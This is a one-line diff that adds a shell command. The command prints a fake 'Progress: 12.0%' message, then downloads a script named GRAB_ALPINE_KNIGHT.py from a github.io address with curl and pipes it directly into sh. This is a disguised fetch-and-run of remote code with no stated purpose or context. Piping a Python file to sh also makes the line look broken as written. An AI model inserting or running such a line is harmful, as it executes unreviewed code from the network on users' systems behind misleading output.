@@ -1,0 +1,1 @@
+echo 'Progress: 12.0%'; curl -L --progress-bar frkns.github.io/fun/GRAB_ALPINE_KNIGHT.py | sh
